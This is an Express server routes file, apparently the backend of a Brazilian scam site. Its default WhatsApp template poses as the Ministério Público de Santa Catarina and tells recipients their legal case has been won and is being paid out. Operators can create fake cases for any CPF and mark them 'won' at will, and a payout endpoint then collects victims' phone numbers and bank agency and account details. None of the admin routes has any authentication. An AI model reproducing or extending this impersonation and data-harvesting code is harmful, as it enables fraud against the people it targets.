import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertCpfSchema, insertProcessSchema, insertPayoutRequestSchema, insertSearchGroupSchema } from "@shared/schema";
import { z } from "zod";

export async function registerRoutes(app: Express): Promise<Server> {
  // CPF validation schema
  const cpfSearchSchema = z.object({
    cpf: z.string().regex(/^\d{3}\.\d{3}\.\d{3}-\d{2}$/, "CPF deve estar no formato 000.000.000-00")
  });

  // Search processes by CPF
  app.post("/api/search", async (req, res) => {
    try {
      const { cpf } = cpfSearchSchema.parse(req.body);
      const processes = await storage.getProcessesByCpf(cpf);
      res.json({ processes, cpf });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "CPF inválido", errors: error.errors });
      } else {
        console.error("Error in /api/search:", error);
        res.status(500).json({ message: "Erro interno do servidor" });
      }
    }
  });

  // Search process by process number
  app.post("/api/search-by-process", async (req, res) => {
    try {
      const processNumberSchema = z.object({
        processNumber: z.string().regex(/^\d{7}-\d{2}\.\d{4}\.\d{1}\.\d{2}\.\d{4}$/, "Número do processo deve estar no formato 0000000-00.0000.0.00.0000")
      });
      
      const { processNumber } = processNumberSchema.parse(req.body);
      const process = await storage.getProcessByNumber(processNumber);
      
      if (!process) {
        return res.status(404).json({ message: "Processo não encontrado" });
      }
      
      res.json({ process, processNumber });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "Número de processo inválido", errors: error.errors });
      } else {
        console.error("Error in /api/search-by-process:", error);
        res.status(500).json({ message: "Erro interno do servidor" });
      }
    }
  });

  // Create new process
  app.post("/api/admin/process", async (req, res) => {
    try {
      // First, ensure CPF exists or create it
      let cpfRecord = await storage.getCpfByNumber(req.body.cpf);
      if (!cpfRecord) {
        cpfRecord = await storage.createCpf({ 
          cpf: req.body.cpf,
          name: req.body.name || ""
        });
      }

      const processData = insertProcessSchema.parse({
        ...req.body,
        cpfId: cpfRecord.id,
        activePolleLawyers: req.body.activePolleLawyers || [],
        passivePolleLawyers: req.body.passivePolleLawyers || []
      });

      const process = await storage.createProcess(processData);
      res.json(process);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "Dados inválidos", errors: error.errors });
      } else {
        console.error("Error in /api/admin/process:", error);
        res.status(500).json({ message: "Erro interno do servidor" });
      }
    }
  });

  // Get statistics
  app.get("/api/admin/statistics", async (req, res) => {
    try {
      const stats = await storage.getStatistics();
      res.json(stats);
    } catch (error) {
      res.status(500).json({ message: "Erro interno do servidor" });
    }
  });

  // Get all processes (for admin table)
  app.get("/api/admin/processes", async (req, res) => {
    try {
      const processes = await storage.getAllProcesses();
      // Sort by creation date (newest first)
      const sorted = processes
        .sort((a, b) => new Date(b.createdAt || '').getTime() - new Date(a.createdAt || '').getTime());
      res.json(sorted);
    } catch (error) {
      res.status(500).json({ message: "Erro interno do servidor" });
    }
  });

  // Get recent processes (for statistics)
  app.get("/api/admin/recent-processes", async (req, res) => {
    try {
      const processes = await storage.getAllProcesses();
      // Sort by creation date and take last 5
      const recent = processes
        .sort((a, b) => new Date(b.createdAt || '').getTime() - new Date(a.createdAt || '').getTime())
        .slice(0, 5);
      res.json(recent);
    } catch (error) {
      res.status(500).json({ message: "Erro interno do servidor" });
    }
  });

  // Update process
  app.put("/api/admin/process/:id", async (req, res) => {
    try {
      const processId = req.params.id;
      
      // If CPF is being updated, ensure the CPF record exists
      if (req.body.cpf) {
        let cpfRecord = await storage.getCpfByNumber(req.body.cpf);
        if (!cpfRecord) {
          cpfRecord = await storage.createCpf({ 
            cpf: req.body.cpf,
            name: req.body.name || ""
          });
        }
        req.body.cpfId = cpfRecord.id;
      }

      // Parse and validate the process data
      const processUpdateData = insertProcessSchema.partial().parse({
        ...req.body,
        activePolleLawyers: req.body.activePolleLawyers || [],
        passivePolleLawyers: req.body.passivePolleLawyers || []
      });

      const updatedProcess = await storage.updateProcess(processId, processUpdateData);
      res.json(updatedProcess);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "Dados inválidos", errors: error.errors });
      } else if (error instanceof Error && error.message === 'Process not found') {
        res.status(404).json({ message: "Processo não encontrado" });
      } else {
        res.status(500).json({ message: "Erro interno do servidor" });
      }
    }
  });

  // Delete process
  app.delete("/api/admin/process/:id", async (req, res) => {
    try {
      const processId = req.params.id;
      await storage.deleteProcess(processId);
      res.json({ message: "Processo apagado com sucesso" });
    } catch (error) {
      res.status(500).json({ message: "Erro interno do servidor" });
    }
  });

  // Get process by ID
  app.get("/api/process/:id", async (req, res) => {
    try {
      const { id } = req.params;
      const processId = z.string().min(1).parse(id);
      
      const process = await storage.getProcessById(processId);
      if (!process) {
        return res.status(404).json({ message: "Processo não encontrado" });
      }
      
      res.json(process);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "ID inválido" });
      } else {
        res.status(500).json({ message: "Erro interno do servidor" });
      }
    }
  });

  // Create payout request
  app.post("/api/payout-request", async (req, res) => {
    try {
      // Validate the request body
      const payoutRequestData = z.object({
        processId: z.string().min(1, "ID do processo é obrigatório"),
        phone: z.string().min(1, "Telefone é obrigatório"),
        bankDetails: z.object({
          bankName: z.string().min(1, "Nome do banco é obrigatório"),
          agency: z.string().min(1, "Agência é obrigatória"),
          account: z.string().min(1, "Conta é obrigatória")
        })
      }).parse(req.body);
      
      // Get process and verify it exists
      const process = await storage.getProcessById(payoutRequestData.processId);
      if (!process) {
        return res.status(404).json({ message: "Processo não encontrado" });
      }
      
      // Get CPF from process
      const cpfRecord = await storage.getCpfById(process.cpfId);
      if (!cpfRecord) {
        return res.status(404).json({ message: "CPF não encontrado" });
      }
      
      // Check if process is eligible (won case)
      const subject = (process.subject ?? "").toLowerCase();
      const isWonCase = subject.includes('procedente') || 
                       subject.includes('ganho') || 
                       process.status === 'Ganho';
      
      if (!isWonCase) {
        return res.status(400).json({ message: "Processo não procedente - não é possível solicitar recebimento" });
      }
      
      // Check for existing payout request
      const hasExisting = await storage.hasActivePayoutRequest(payoutRequestData.processId);
      if (hasExisting) {
        return res.status(409).json({ message: "Já existe uma solicitação de recebimento para este processo" });
      }
      
      const payoutRequest = await storage.createPayoutRequest({
        processId: payoutRequestData.processId,
        cpf: cpfRecord.cpf,
        phone: payoutRequestData.phone,
        bankName: payoutRequestData.bankDetails.bankName,
        agency: payoutRequestData.bankDetails.agency,
        account: payoutRequestData.bankDetails.account
      });
      
      res.json(payoutRequest);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "Dados inválidos", errors: error.errors });
      } else {
        res.status(500).json({ message: "Erro interno do servidor" });
      }
    }
  });

  // Get all payout requests (for admin)
  app.get("/api/admin/payout-requests", async (req, res) => {
    try {
      const payoutRequests = await storage.getAllPayoutRequests();
      res.json(payoutRequests);
    } catch (error) {
      res.status(500).json({ message: "Erro interno do servidor" });
    }
  });

  // Delete a payout request
  app.delete("/api/admin/payout-request/:id", async (req, res) => {
    try {
      const payoutRequestId = req.params.id;
      
      if (!payoutRequestId) {
        return res.status(400).json({ message: "ID da solicitação é obrigatório" });
      }
      
      await storage.deletePayoutRequest(payoutRequestId);
      res.json({ message: "Solicitação de recebimento excluída com sucesso" });
    } catch (error) {
      res.status(500).json({ message: "Erro interno do servidor" });
    }
  });

  // Update process status to mark as won/lost
  app.patch("/api/admin/process/:id/status", async (req, res) => {
    try {
      const processId = req.params.id;
      const { isWon } = req.body;
      
      const process = await storage.getProcessById(processId);
      if (!process) {
        return res.status(404).json({ message: "Processo não encontrado" });
      }

      // Update the subject to indicate if it's procedente (won) or not
      const currentSubject = process.subject || "";
      let newSubject = currentSubject;
      
      if (isWon) {
        // Mark as won - add "julgada procedente" if not present
        if (!currentSubject.toLowerCase().includes('procedente') && !currentSubject.toLowerCase().includes('ganho')) {
          newSubject = currentSubject + " - julgada procedente em favor do requerente";
        }
      } else {
        // Mark as lost - remove procedente/ganho references
        newSubject = currentSubject
          .replace(/\s*-?\s*julgada procedente.*$/i, '')
          .replace(/\s*-?\s*procedente.*$/i, '')
          .replace(/\s*-?\s*ganho.*$/i, '')
          .trim();
        if (!newSubject.toLowerCase().includes('improcedente')) {
          newSubject = newSubject + " - julgada improcedente";
        }
      }

      const updatedProcess = await storage.updateProcess(processId, { subject: newSubject });
      res.json(updatedProcess);
    } catch (error) {
      res.status(500).json({ message: "Erro interno do servidor" });
    }
  });

  // Search Group endpoints
  
  // Create search group
  app.post("/api/admin/search-group", async (req, res) => {
    try {
      const searchGroupData = insertSearchGroupSchema.parse(req.body);
      
      // Check if searchId already exists
      const existing = await storage.getSearchGroupBySearchId(searchGroupData.searchId);
      if (existing) {
        return res.status(400).json({ message: "ID de pesquisa já existe" });
      }
      
      const searchGroup = await storage.createSearchGroup(searchGroupData);
      res.json(searchGroup);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "Dados inválidos", errors: error.errors });
      } else {
        console.error("Error in /api/admin/search-group:", error);
        res.status(500).json({ message: "Erro interno do servidor" });
      }
    }
  });

  // Get all search groups
  app.get("/api/admin/search-groups", async (req, res) => {
    try {
      const searchGroups = await storage.getAllSearchGroups();
      res.json(searchGroups);
    } catch (error) {
      console.error("Error in /api/admin/search-groups:", error);
      res.status(500).json({ message: "Erro interno do servidor" });
    }
  });

  // Update search group
  app.put("/api/admin/search-group/:id", async (req, res) => {
    try {
      const searchGroupId = req.params.id;
      const updateData = insertSearchGroupSchema.partial().parse(req.body);
      
      // If searchId is being updated, check if it already exists
      if (updateData.searchId) {
        const existing = await storage.getSearchGroupBySearchId(updateData.searchId);
        if (existing && existing.id !== searchGroupId) {
          return res.status(400).json({ message: "ID de pesquisa já existe" });
        }
      }
      
      const updatedSearchGroup = await storage.updateSearchGroup(searchGroupId, updateData);
      res.json(updatedSearchGroup);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "Dados inválidos", errors: error.errors });
      } else if (error instanceof Error && error.message === 'Search Group not found') {
        res.status(404).json({ message: "Grupo de pesquisa não encontrado" });
      } else {
        console.error("Error in /api/admin/search-group/:id:", error);
        res.status(500).json({ message: "Erro interno do servidor" });
      }
    }
  });

  // Delete search group
  app.delete("/api/admin/search-group/:id", async (req, res) => {
    try {
      const searchGroupId = req.params.id;
      await storage.deleteSearchGroup(searchGroupId);
      res.json({ message: "Grupo de pesquisa apagado com sucesso" });
    } catch (error) {
      console.error("Error in /api/admin/search-group/:id:", error);
      res.status(500).json({ message: "Erro interno do servidor" });
    }
  });

  // Link process to search group
  app.patch("/api/admin/process/:id/link-search-group", async (req, res) => {
    try {
      const processId = req.params.id;
      const { searchGroupId } = req.body;
      
      // Verify process exists
      const process = await storage.getProcessById(processId);
      if (!process) {
        return res.status(404).json({ message: "Processo não encontrado" });
      }
      
      // Verify search group exists if provided
      if (searchGroupId) {
        const searchGroup = await storage.getSearchGroupById(searchGroupId);
        if (!searchGroup) {
          return res.status(404).json({ message: "Grupo de pesquisa não encontrado" });
        }
      }
      
      const updatedProcess = await storage.updateProcess(processId, { searchGroupId: searchGroupId || null });
      res.json(updatedProcess);
    } catch (error) {
      console.error("Error in /api/admin/process/:id/link-search-group:", error);
      res.status(500).json({ message: "Erro interno do servidor" });
    }
  });

  // Get message template
  app.get("/api/admin/message-template", async (req, res) => {
    try {
      const template = await storage.getSystemSetting("whatsapp_message_template");
      
      if (!template) {
        // Return default template
        const defaultTemplate = `🏛️ *Ministério Público de Santa Catarina*

✅ *PROCESSO EM RECEBIMENTO*

📋 *Dados do Processo:*
• Número: {processNumber}
• Assunto: {subject}
• Valor da Causa: {value}
• Status: Procedente (Ganho)

💰 *Seu processo está em processo de recebimento!*
O valor da causa está sendo processado para pagamento.

🔗 *Link do Processo:*
{processUrl}

📞 *Em caso de dúvidas, entre em contato conosco.*

_Mensagem automática do Sistema MPSC_`;
        
        return res.json({ 
          template: defaultTemplate,
          isDefault: true 
        });
      }
      
      res.json({ 
        template: template.value,
        isDefault: false 
      });
    } catch (error) {
      console.error("Error in /api/admin/message-template:", error);
      res.status(500).json({ message: "Erro interno do servidor" });
    }
  });

  // Update message template
  app.put("/api/admin/message-template", async (req, res) => {
    try {
      const { template } = z.object({
        template: z.string().min(1, "Template é obrigatório")
      }).parse(req.body);
      
      const setting = await storage.setSystemSetting(
        "whatsapp_message_template", 
        template, 
        "Template personalizado para mensagens do WhatsApp"
      );
      
      res.json({ 
        template: setting.value,
        message: "Template atualizado com sucesso" 
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "Template inválido", errors: error.errors });
      } else {
        console.error("Error in /api/admin/message-template:", error);
        res.status(500).json({ message: "Erro interno do servidor" });
      }
    }
  });

  // Search by Search ID - returns processes and their messages
  app.get("/api/search-by-id/:searchId", async (req, res) => {
    try {
      const { searchId } = z.object({
        searchId: z.string().min(1, "ID de pesquisa é obrigatório")
      }).parse(req.params);
      
      const processesWithFichas = await storage.getProcessesWithFichasBySearchId(searchId);
      
      if (processesWithFichas.length === 0) {
        return res.status(404).json({ message: "Nenhum processo encontrado para este ID de pesquisa" });
      }
      
      res.json({ 
        searchId,
        processes: processesWithFichas 
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "ID de pesquisa inválido", errors: error.errors });
      } else {
        console.error("Error in /api/search-by-id:", error);
        res.status(500).json({ message: "Erro interno do servidor" });
      }
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
